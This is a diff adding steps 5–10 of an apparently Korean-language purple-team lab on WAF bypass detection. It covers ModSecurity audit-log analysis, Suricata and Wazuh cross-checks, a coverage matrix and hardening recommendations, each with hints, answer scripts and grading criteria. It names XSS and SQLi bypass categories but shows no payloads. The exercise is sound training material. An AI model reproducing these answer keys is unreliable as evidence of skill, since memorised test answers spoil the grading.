+      ssh -n 6v6-web 'sudo grep -oE "id .\"[0-9]+\"" /var/log/apache2/modsec_audit.log | sort | uniq -c | sort -rn | head -8'
+      echo "=== 응답 코드 분포 ==="
+      ssh -n 6v6-web 'sudo grep -E "^HTTP/[0-9.]+ [0-9]" /var/log/apache2/modsec_audit.log | awk "{print \$2}" | sort | uniq -c'
+      echo "=== RelevantStatus (사각지대) ==="
+      ssh -n 6v6-web 'sudo grep SecAuditLogRelevantStatus /etc/modsecurity/*.conf /etc/apache2/*/*.conf 2>/dev/null | head -1'
+    answer_detail: |
+      audit log = SecAuditLogType Serial (Native multiline, --boundary-- 구분). jq 불가,
+      grep 파싱. 매치 룰: 941100/941110/941160(XSS), 942(SQLi), 949110(anomaly threshold),
+      980130(anomaly score). 응답 403 다수. SecAuditLogRelevantStatus "^(?:5|4(?!04))"
+      → 4xx(404제외)/5xx 만 기록 = 200 우회 성공은 audit log 사각지대. Purple 에서 보완.
+    verify:
+      type: output_contains
+      expect: '941'
+      field: stdout
+      semantic:
+        intent: Blue — ModSec Serial audit 분석 + 매치 룰 + RelevantStatus 사각지대.
+        success_criteria: ["Serial 형식 인지", "매치 룰 분포", "RelevantStatus 사각지대"]
+        acceptable_methods:
+          - |
+            **[OSS] grep 매치 룰 분포** — Serial audit log.
+              ssh 6v6-web 'sudo grep -oE "id .\"[0-9]+\"" /var/log/apache2/modsec_audit.log | sort | uniq -c | sort -rn'
+            예상 출력 `941100/941110/941160/942/949110/980130 카운트`.
+            운영 해석: 941=XSS, 942=SQLi, 949110=anomaly 차단.
+          - |
+            **[OSS] grep 응답 코드 분포** — --F-- 섹션.
+              ssh 6v6-web 'sudo grep -E "^HTTP/" /var/log/apache2/modsec_audit.log | awk "{print \$2}" | sort | uniq -c'
+            예상 출력 `403 다수`.
+            운영 해석: 차단 정상 작동.
+          - |
+            **[OSS] SecAuditLogRelevantStatus 확인** — 사각지대.
+              ssh 6v6-web 'sudo grep SecAuditLogRelevantStatus ...'
+            예상 출력 `^(?:5|4(?!04))`.
+            운영 해석: 200 우회는 audit log 미기록 (blind spot).
+          - "**[OSS] python3 json** — (만약 JSON format 환경이면 fallback)."
+        negative_signs: ["jq 로 파싱 시도(Serial 인데)", "RelevantStatus 사각지대 누락"]
+    target_vm: web
+    risk_level: low
+
+  - order: 6
+    instruction: |
+      ## 🎯 MISSION (Blue Team — Suricata 측 cross-check)
+
+      STEP 1~4 의 공격을 ips Suricata eve.json 에서 추적하라. ModSec(web) 과 Suricata
+      (ips) 의 동일 공격에 대한 L7 view 를 cross-check 한다.
+
+      ## 💻 실행 명령
+
+      ```bash
+      # Suricata event_type 분포
+      ssh 6v6-ips 'sudo tail -500 /var/log/suricata/eve.json | jq -r ".event_type" 2>/dev/null | sort | uniq -c | sort -rn'
+      # juice.6v6.lab 의 http event (url + status)
+      ssh 6v6-ips 'sudo tail -500 /var/log/suricata/eve.json | jq -rc "select(.event_type==\"http\" and .http.hostname==\"juice.6v6.lab\") | \"\(.http.status) \(.http.url)\"" 2>/dev/null | tail -8'
+      # alert event (있으면 signature)
+      ssh 6v6-ips 'sudo tail -500 /var/log/suricata/eve.json | jq -rc "select(.event_type==\"alert\") | .alert.signature" 2>/dev/null | tail -5'
+      ```
+
+      ## 📋 확인 사항
+
+      - event_type 분포 (flow / tls / http / fileinfo / stats)
+      - http event 에 우회 시도 URL + 403 status (web ModSec 차단을 Suricata 도 관측)
+      - alert event (ETOpen 룰셋이 XSS 잡으면 signature, 없으면 http event 만)
+
+      ## 💡 왜 이걸 하는가?
+
+      ModSec(web) 은 L7 application 차단, Suricata(ips) 는 네트워크 L7 관측. 두 도구의
+      동일 공격 view 를 cross-check 하면 단일 도구 누락을 보완한다. Suricata 는 평문
+      http 를 보므로 우회 시도 URL 을 그대로 관측한다.
+
+      ## 🔍 결과 해석
+
+      - http event 의 403 = ModSec 차단을 Suricata 도 확인 (cross-validation)
+      - http event 7건 vs flow 261 = 대부분 trTLS, 평문 http 는 우회 실습 트래픽
+      - alert 없으면 = ETOpen 룰셋이 이 XSS 패턴 미보유 → Purple 에서 custom 룰 권고
+
+      ## ⚠️ 비정상 시 대응
+
+      - eve.json 없음 — `ssh 6v6-ips 'sudo systemctl status suricata'` 또는 `sudo ls /var/log/suricata/`
+      - juice 흔적 0 — tail 범위 확대 (tail -2000) 또는 STEP 1 재실행
+    hint: |
+      Suricata eve.json — event_type 분포 + http event(juice 403) + alert. ModSec 과
+      cross-check. jq 동작(ips 에 jq 있음). alert 없으면 ETOpen 미보유 → Purple 권고.
+    category: blueteam
+    points: 12
+    answer: |
+      echo "=== event_type 분포 ==="
+      ssh -n 6v6-ips 'sudo tail -500 /var/log/suricata/eve.json | jq -r ".event_type" 2>/dev/null | sort | uniq -c | sort -rn'
+      echo "=== juice http event ==="
+      ssh -n 6v6-ips 'sudo tail -500 /var/log/suricata/eve.json | jq -rc "select(.event_type==\"http\" and .http.hostname==\"juice.6v6.lab\") | \"\(.http.status) \(.http.url)\"" 2>/dev/null | tail -8'
+      echo "=== alert ==="
+      ssh -n 6v6-ips 'sudo tail -500 /var/log/suricata/eve.json | jq -rc "select(.event_type==\"alert\") | .alert.signature" 2>/dev/null | tail -5'
+    answer_detail: |
+      Suricata event_type: flow(다수)/tls/http/fileinfo/stats. juice http event 에
+      우회 시도 URL + 403 status 관측 → ModSec 차단을 Suricata 도 cross-validation.
+      ETOpen 룰셋이 이 XSS 변형 signature 미보유면 alert event 없음 → http event 만으로
+      관측. Purple 에서 custom Suricata 룰 권고 가능.
+    verify:
+      type: output_contains
+      expect: http
+      field: stdout
+      semantic:
+        intent: Blue — Suricata eve.json cross-check (ModSec 과 동일 공격 view).
+        success_criteria: ["event_type 분포", "juice http event", "ModSec cross-validation"]
+        acceptable_methods:
+          - |
+            **[OSS] jq event_type 분포** — Suricata 관측 범위.
+              ssh 6v6-ips 'sudo tail -500 /var/log/suricata/eve.json | jq -r ".event_type" | sort | uniq -c'
+            예상 출력 `flow/tls/http/fileinfo/stats`.
+            운영 해석: http event 가 L7 우회 시도 관측.
+          - |
+            **[OSS] jq http event (hostname filter)** — 우회 URL.
+              jq "select(.http.hostname==\"juice.6v6.lab\")"
+            예상 출력 `403 /?q=...`.
+            운영 해석: ModSec 차단을 Suricata 도 확인 = cross-validation.
+          - |
+            **[OSS] jq alert signature** — ETOpen 룰 매치.
+            예상 출력 `signature 또는 없음`.
+            운영 해석: 없으면 ETOpen 미보유 → custom 룰 권고.
+        negative_signs: ["http event 누락", "cross-check 결론 없음"]
+    target_vm: ips
+    risk_level: low
+
+  - order: 7
+    instruction: |
+      ## 🎯 MISSION (Blue Team — Wazuh SIEM 통합 + Detection Gap)
+
+      Wazuh SIEM(siem) 으로 각 센서의 alert 통합 상태를 확인하라. 어느 센서의 alert 가
+      siem 에 도달하고 어느 것이 누락(Detection Gap)되는지 식별한다.
+
+      ## 💻 실행 명령
+
+      ```bash
+      # 연결된 agent 목록 (web/fw/ips Active 확인)
+      ssh 6v6-siem 'sudo /var/ossec/bin/agent_control -l 2>/dev/null | head -8'
+      # agent 별 alert 분포 (siem 에 jq 설치되어 있음)
+      ssh 6v6-siem 'sudo tail -2000 /var/ossec/logs/alerts/alerts.json | jq -r ".agent.name" 2>/dev/null | sort | uniq -c | sort -rn'
+      # ips Suricata alert (86601) 수신 확인
+      ssh 6v6-siem 'sudo tail -2000 /var/ossec/logs/alerts/alerts.json | jq -rc "select(.agent.name==\"ips\") | .rule.id" 2>/dev/null | sort | uniq -c | sort -rn | head'
+      # web agent 의 alert 종류 (ModSec 룰 alert 있나 — Detection Gap 확인)
+      ssh 6v6-siem 'sudo tail -2000 /var/ossec/logs/alerts/alerts.json | jq -rc "select(.agent.name==\"web\") | .rule.id" 2>/dev/null | sort | uniq -c | sort -rn | head'
+      ```
+
+      ## 📋 확인 사항
+
+      - agent 연결: web(001)/fw(002)/ips(003) Active
+      - ips alert 에 86601(Suricata) 수신됨
+      - **web agent 의 alert 에는 ModSec 룰(941/942)이 없음** — web wazuh agent 가
+        modsec_audit.log 를 monitor 안 함 = **Detection Gap**
+
+      ## 💡 왜 이걸 하는가?
+
+      SIEM 통합의 핵심은 "모든 센서의 신호가 한 곳에 모이는가". 이 환경은 Suricata(ips)
+      alert 는 siem 에 도달하지만, web 의 ModSec 차단(403)은 siem 으로 전송되지 않는다
+      (web agent 가 SCA/agent 이벤트만 보고, modsec_audit.log localfile 미설정). 즉
+      "WAF 가 차단한 공격이 SIEM 에는 안 보이는" Detection Gap 이 존재한다.
+
+      ## 🔍 결과 해석
+
+      - ips 86601 수신 = Suricata→siem 통합 정상
+      - web ModSec 룰 부재 = ModSec→siem 미통합 = Detection Gap → Purple 보완 대상
+      - siem 에서 jq 가 동작해야 분석 가능 (없으면 yum install jq)
+
+      ## ⚠️ 비정상 시 대응
+
+      - agent Disconnected — `ssh 6v6-siem 'sudo /var/ossec/bin/agent_control -i <ID>'`
+      - jq command not found — `ssh 6v6-siem 'sudo yum install -y jq'`
+      - alerts.json 없음 — wazuh-analysisd 상태 확인 (`wazuh-control status`)
+    hint: |
+      agent_control -l(web/fw/ips Active) + agent별 alert 분포 + ips 86601 수신 +
+      web ModSec 룰 부재(Detection Gap). siem 에 jq 필요. ModSec→siem 미통합이 핵심.
+    category: blueteam
+    points: 14
+    answer: |
+      echo "=== agent 목록 ==="
+      ssh -n 6v6-siem 'sudo /var/ossec/bin/agent_control -l 2>/dev/null | head -8'
+      echo "=== agent별 alert 분포 ==="
+      ssh -n 6v6-siem 'sudo tail -2000 /var/ossec/logs/alerts/alerts.json | jq -r ".agent.name" 2>/dev/null | sort | uniq -c | sort -rn'
+      echo "=== ips Suricata alert (86601) ==="
+      ssh -n 6v6-siem 'sudo tail -2000 /var/ossec/logs/alerts/alerts.json | jq -rc "select(.agent.name==\"ips\") | .rule.id" 2>/dev/null | sort | uniq -c | sort -rn | head'
+      echo "=== web agent alert (ModSec 룰 있나) ==="
+      ssh -n 6v6-siem 'sudo tail -2000 /var/ossec/logs/alerts/alerts.json | jq -rc "select(.agent.name==\"web\") | .rule.id" 2>/dev/null | sort | uniq -c | sort -rn | head'
+    answer_detail: |
+      agent: web(001)/fw(002)/ips(003) Active. ips alert 에 86601(Suricata) 수신 →
+      Suricata→siem 통합 정상. web agent 의 alert 는 501/503/506(agent 이벤트) + 19009
+      (CIS SCA) 뿐, ModSec 룰(941/942) 없음 = web agent 가 modsec_audit.log 를 monitor
+      안 함 = Detection Gap. siem 컨테이너는 jq 필요(yum install jq). Purple 에서 web
+      ossec.conf 에 modsec localfile 추가 권고.
+    verify:
+      type: output_contains
+      expect: Active
+      field: stdout
+      semantic:
+        intent: Blue — Wazuh SIEM 통합 상태 + ModSec Detection Gap 식별.
+        success_criteria: ["agent Active 확인", "ips 86601 수신", "web ModSec Detection Gap"]
+        acceptable_methods:
+          - |
+            **[OSS] agent_control -l** — 연결 agent.
+              ssh 6v6-siem 'sudo /var/ossec/bin/agent_control -l'
+            예상 출력 `web/fw/ips Active`.
+            운영 해석: 센서 연결 상태.
+          - |
+            **[OSS] jq agent별 alert 분포** — 통합 가시성.
+              ssh 6v6-siem 'sudo tail -2000 .../alerts.json | jq -r ".agent.name" | sort | uniq -c'
+            예상 출력 `ips/fw/web/wazuh.manager 카운트`.
+            운영 해석: 어느 센서가 신호를 보내는가.
+          - |
+            **[OSS] jq web ModSec 룰 부재 확인** — Detection Gap.
+              jq "select(.agent.name==\"web\") | .rule.id"
+            예상 출력 `941/942 없음, SCA/agent 이벤트만`.
+            운영 해석: ModSec→siem 미통합 = blind spot.
+        negative_signs: ["Detection Gap 식별 안 함", "jq 없이 분석 시도"]
+    target_vm: bastion
+    risk_level: low
+
+  - order: 8
+    instruction: |
+      ## 🎯 MISSION (Purple Team — Coverage Matrix)
+
+      Red(우회 시도) 와 Blue(detection) 결과를 통합해 우회 카테고리별 **Coverage Matrix**
+      를 작성하라. 어느 변형이 차단되고, 어느 것이 사각지대인지 정량화한다.
+
+      ## 💻 산출물 (Coverage Matrix)
+
+      ```markdown
+      # W10 Coverage Matrix — 우회 시도 vs detection
+      | 우회 카테고리 | 시도 | web ModSec | Suricata | Wazuh SIEM | Coverage |
+      |---------------|------|-----------|----------|-----------|----------|
+      | baseline XSS  | 1    | 403 차단   | http관측 | ✗(미통합) | 부분     |
+      | case mixing   | 1    | 403 차단   | http관측 | ✗         | 부분     |
+      | URL encoding  | 1    | 403 차단   | http관측 | ✗         | 부분     |
+      | nested tag    | 1    | 403 차단   | http관측 | ✗         | 부분     |
+      | event handler | 1    | 403 차단   | http관측 | ✗         | 부분     |
+      | SQLi tamper   | 3    | 403 차단   | http관측 | ✗         | 부분     |
+      ## 사각지대 (Detection Gap) 2종
+      1. RelevantStatus 4xx/5xx → 우회 성공(200) 시 ModSec audit log 미기록
+      2. web ModSec 차단이 SIEM 미통합 (web agent 가 modsec_audit.log monitor 안 함)
+      ## 핵심 발견
+      - paranoia 1 + libinjection 은 표준 변형 전부 차단 (WAF 자체는 견고)
+      - 그러나 SIEM 가시성에 gap → 차단해도 관제 화면엔 안 보임
+      ```
+
+      ## 📋 채점
+
+      - 우회 카테고리별 시도/차단/SIEM Coverage 매트릭스
+      - Detection Gap 2종 식별
+
+      ## 💡 왜 이걸 하는가?
+
+      Purple Team = Red 의 공격과 Blue 의 detection 을 한 표로 매핑해 "무엇이 잡히고
+      무엇이 새는가" 를 정량화. 차단(WAF) 성공과 가시성(SIEM) 은 별개 — 둘 다 봐야
+      실제 방어 성숙도를 평가한다.
+
+      ## 🔍 결과 해석
+
+      - 모든 변형 차단 + SIEM gap = "차단은 되나 관제 사각지대" = Purple 보완 우선순위
+    hint: |
+      Coverage Matrix — 우회 카테고리 × (ModSec/Suricata/SIEM). Detection Gap 2종
+      (RelevantStatus 200 미기록 + ModSec siem 미통합). 차단≠가시성 구분.
+    category: purple
+    points: 8
+    answer: |
+      cat <<'EOF'
+      # W10 Coverage Matrix
+      | 우회 카테고리 | 시도 | ModSec | Suricata | SIEM | Coverage |
+      | baseline XSS  | 1 | 403 | http관측 | ✗ | 부분 |
+      | case mixing   | 1 | 403 | http관측 | ✗ | 부분 |
+      | URL encoding  | 1 | 403 | http관측 | ✗ | 부분 |
+      | nested tag    | 1 | 403 | http관측 | ✗ | 부분 |
+      | event handler | 1 | 403 | http관측 | ✗ | 부분 |
+      | SQLi tamper   | 3 | 403 | http관측 | ✗ | 부분 |
+      ## Detection Gap 2종
+      1. RelevantStatus 4xx/5xx → 우회(200) 미기록
+      2. web ModSec → SIEM 미통합
+      EOF
+    answer_detail: |
+      Coverage Matrix: 모든 우회 카테고리가 web ModSec 403 차단 + Suricata http 관측,
+      그러나 SIEM 통합은 ✗(web ModSec 미통합). Detection Gap 2종: (1) RelevantStatus
+      4xx/5xx 라 200 우회 미기록, (2) web ModSec 차단이 SIEM 에 안 옴. 차단 성공과
+      관제 가시성은 별개임을 정량화.
+    verify:
+      type: output_contains
+      expect: Coverage
+      field: stdout
+      semantic:
+        intent: Purple — Coverage Matrix + Detection Gap 정량화.
+        success_criteria: ["우회 카테고리별 매트릭스", "Detection Gap 2종", "차단≠가시성"]
+        acceptable_methods:
+          - |
+            **[OSS] markdown Coverage Matrix** — Red×Blue 매핑.
+              # 우회 카테고리 × (ModSec/Suricata/SIEM)
+            예상 출력 `매트릭스 표`.
+            운영 해석: 무엇이 잡히고 무엇이 새는가.
+          - |
+            **[OSS] Detection Gap 식별** — 사각지대 2종.
+            예상 출력 `RelevantStatus 200 미기록 + ModSec siem 미통합`.
+            운영 해석: 차단≠관제 가시성.
+        negative_signs: ["Detection Gap 누락", "매트릭스 없이 서술만"]
+    target_vm: bastion
+    risk_level: low
+
+  - order: 9
+    instruction: |
+      ## 🎯 MISSION (Purple Team — 방어 강화 5 표준 권고)
+
+      Coverage Matrix(STEP 8)의 Detection Gap 을 보완하는 **방어 강화 5 표준** 을
+      구체적 설정/룰과 함께 권고서로 작성하라 (실행 X — 설계만).
+
+      ## 💻 산출물 (방어 강화 권고서)
+
+      ```markdown
+      # W10 방어 강화 5 표준 (Purple 권고)
+      ## 1. paranoia level 상승 (1 → 2)
+      crs-setup.conf: SecAction "setvar:tx.paranoia_level=2"
+      효과: encoding 우회 패턴 추가 감지. 부작용: false-positive 증가 → vhost별 점진 적용.
+      ## 2. 다중 transformation
+      SecRule 에 t:lowercase, t:urlDecodeUni, t:htmlEntityDecode, t:replaceComments 연속 적용
+      효과: entity / encoding 우회 패턴 정규화 후 매칭.
+      ## 3. CDB list — known scanner 차단
+      /var/ossec/etc/lists/known-scanners 에 sqlmap/nikto/wafw00f UA 등록 → Wazuh rule level 상승
+      ## 4. Active Response — 우회 burst 차단
+      Wazuh AR: 941/942 룰 burst (5분 N회 초과) → fw drop 10분 + 운영자 알림
+      ## 5. Detection Gap 보완
+      (a) web ossec.conf 에 modsec_audit.log localfile 추가 → ModSec 차단이 SIEM 도달
+          <localfile><log_format>apache</log_format><location>/var/log/apache2/modsec_audit.log</location></localfile>
+      (b) SecAuditLogRelevantStatus 에 200 포함 검토(트래픽量 trade-off) 또는 access.log 모니터링
+      ```
+
+      ## 📋 채점
+
+      - 5 표준 각각 구체적 설정/룰 + 효과 + 부작용
+      - 특히 #5 가 STEP 7/8 의 Detection Gap 2종을 직접 보완
+
+      ## 💡 왜 이걸 하는가?
+
+      Purple 의 최종 산출물은 "Red 가 보여준 위협 + Blue 가 찾은 gap → 구체적 방어 강화".
+      추상적 권고("강화하세요")가 아니라 실제 설정 라인/룰 ID 까지 제시해야 운영팀이
+      바로 적용할 수 있다.
+
+      ## 🔍 결과 해석
+
+      - 5 표준 적용 시: 우회 패턴 추가 차단 + SIEM 가시성 확보 + 자동 대응
+    hint: |
+      방어 5표준 — paranoia 2 / 다중 transform / CDB scanner / Active Response /
+      Detection Gap 보완(modsec localfile + RelevantStatus). 구체 설정·룰 ID 포함.
+    category: purple
+    points: 10
+    answer: |
+      cat <<'EOF'
+      # W10 방어 강화 5 표준
+      1. paranoia 1→2: setvar:tx.paranoia_level=2 (FP 증가 → vhost별 점진)
+      2. 다중 transform: t:lowercase,urlDecodeUni,htmlEntityDecode,replaceComments
+      3. CDB list: known-scanners (sqlmap/nikto/wafw00f UA) → level 상승
+      4. Active Response: 941/942 burst → fw drop 10분
+      5. Detection Gap 보완:
+         (a) web ossec.conf 에 modsec_audit.log localfile 추가 → SIEM 통합
+         (b) RelevantStatus 200 포함 검토 또는 access.log 모니터링
+      EOF
+    answer_detail: |
+      방어 5표준: (1) paranoia 1→2 점진 적용, (2) 다중 transformation 으로 encoding/
+      entity 정규화, (3) CDB list 로 scanner UA 차단, (4) Active Response 로 burst 자동
+      차단, (5) Detection Gap 보완 — web ossec.conf modsec localfile 추가(SIEM 통합) +
+      RelevantStatus 조정. #5 가 STEP 7/8 의 gap 2종을 직접 해결.
+    verify:
+      type: output_contains
+      expect: paranoia
+      field: stdout
+      semantic:
+        intent: Purple — 방어 강화 5 표준 (구체 설정/룰 + Detection Gap 보완).
+        success_criteria: ["5 표준", "구체 설정/룰", "Detection Gap 보완"]
+        acceptable_methods:
+          - |
+            **[OSS] paranoia level 상승** — CRS.
+              setvar:tx.paranoia_level=2
+            예상 출력 `paranoia 2 + FP trade-off`.
+            운영 해석: 추가 룰 활성, vhost별 점진.
+          - |
+            **[OSS] 다중 transformation** — ModSec.
+              t:lowercase,urlDecodeUni,htmlEntityDecode
+            예상 출력 `transform chain`.
+            운영 해석: 우회 패턴 정규화.
+          - |
+            **[OSS] CDB list + Active Response** — Wazuh.
+            예상 출력 `scanner UA 차단 + burst drop`.
+            운영 해석: 자동 대응.
+          - |
+            **[OSS] Detection Gap 보완** — modsec localfile + RelevantStatus.
+            예상 출력 `web ossec.conf localfile + 200 검토`.
+            운영 해석: SIEM 통합 + 사각지대 축소.
+        negative_signs: ["추상적 권고만", "Detection Gap 보완 누락", "설정/룰 없음"]
+    target_vm: bastion
+    risk_level: low
+
+  - order: 10
+    instruction: |
+      ## 🎯 MISSION (Cleanup)
+
+      실습 중 생성한 임시 산출물(sqlmap output, 추가한 /etc/hosts 항목)을 정리하고,
+      실습이 환경에 영구 변경을 남기지 않았는지 확인하라.
+
+      ## 💻 실행 명령
+
+      ```bash
+      # sqlmap 세션/출력 디렉토리 정리
+      ssh 6v6-attacker 'rm -rf ~/.local/share/sqlmap/output/* 2>/dev/null; echo "sqlmap output 정리 완료"'
+      # STEP 3 에서 추가한 /etc/hosts 항목 제거 (실습 전 상태 복원 — 선택)
+      ssh 6v6-attacker 'sudo sed -i "/juice.6v6.lab dvwa.6v6.lab/d" /etc/hosts 2>/dev/null; echo "hosts 복원"'
+      # web ModSec 설정 미변경 확인 (우리는 설정을 바꾸지 않았어야 함)
+      ssh 6v6-web 'sudo grep -c SecRuleEngine /etc/modsecurity/*.conf /etc/apache2/*/*.conf 2>/dev/null | tail -1'
+      echo "=== cleanup 완료 ==="
+      ```
+
+      ## 📋 확인 사항
+
+      - sqlmap output 정리됨
+      - 임시 hosts 항목 제거 (또는 유지 결정 명시)
+      - ModSec 설정은 실습으로 변경되지 않음 (우리는 우회 시도만 했고 설정 변경 X)
+
+      ## 💡 왜 이걸 하는가?
+
+      실습 후 환경을 깨끗이 복원하는 것은 다음 학생/실습의 신뢰성을 보장한다. 특히
+      우회 실습은 공격 트래픽을 남기므로, 무엇을 변경했고 무엇을 복원했는지 명확히
+      기록해야 한다. ModSec 설정을 건드리지 않았음을 확인하는 것도 중요(우리는 Red
+      관점의 우회 시도 + Blue 관점의 로그 분석만 했고, 실제 룰 변경은 STEP 9 의 권고로만).
+
+      ## 🔍 결과 해석
+
+      - cleanup 완료 = 다음 실습 영향 없음
+      - ModSec 설정 미변경 = STEP 9 권고는 설계만 (실배포 X)
+    hint: |
+      sqlmap output 정리 + 임시 hosts 제거 + ModSec 설정 미변경 확인. 우회 실습은
+      설정을 바꾸지 않고 시도/분석만 — 환경 깨끗이 복원.
+    category: cleanup
+    points: 6
+    answer: |
+      ssh -n 6v6-attacker 'rm -rf ~/.local/share/sqlmap/output/* 2>/dev/null; echo "sqlmap output 정리 완료"'
+      ssh -n 6v6-attacker 'sudo sed -i "/juice.6v6.lab dvwa.6v6.lab/d" /etc/hosts 2>/dev/null; echo "hosts 복원"'
+      ssh -n 6v6-web 'sudo grep -c SecRuleEngine /etc/modsecurity/*.conf /etc/apache2/*/*.conf 2>/dev/null | tail -1'
+      echo "=== cleanup 완료 ==="
+    answer_detail: |
+      cleanup: sqlmap output 디렉토리 정리, STEP 3 의 임시 /etc/hosts 항목 제거,
+      ModSec 설정 미변경 확인. 우회 실습은 공격 시도 + 로그 분석만 수행하고 WAF 설정은
+      바꾸지 않음(STEP 9 권고는 설계만). 다음 실습을 위한 환경 복원.
+    verify:
+      type: output_contains
+      expect: 완료
+      field: stdout
+      semantic:
+        intent: Cleanup — 임시 산출물 정리 + 환경 복원 확인.
+        success_criteria: ["sqlmap output 정리", "임시 hosts 처리", "ModSec 설정 미변경 확인"]
+        acceptable_methods:
+          - |
+            **[OSS] sqlmap output 정리** — 임시 파일.
+              ssh 6v6-attacker 'rm -rf ~/.local/share/sqlmap/output/*'
+            예상 출력 `정리 완료`.
+            운영 해석: 다음 실습 영향 제거.
+          - |
+            **[OSS] hosts 복원** — 임시 항목 제거.
+              ssh 6v6-attacker 'sudo sed -i "/juice.6v6.lab/d" /etc/hosts'
+            예상 출력 `hosts 복원`.
+            운영 해석: 실습 전 상태 복원.
+          - |
+            **[OSS] ModSec 설정 미변경 확인** — 무결성.
+            예상 출력 `SecRuleEngine 카운트 동일`.
+            운영 해석: 우회 실습은 설정 변경 X.
+        negative_signs: ["정리 누락", "ModSec 설정 변경됨"]
+    target_vm: attacker
+    risk_level: low
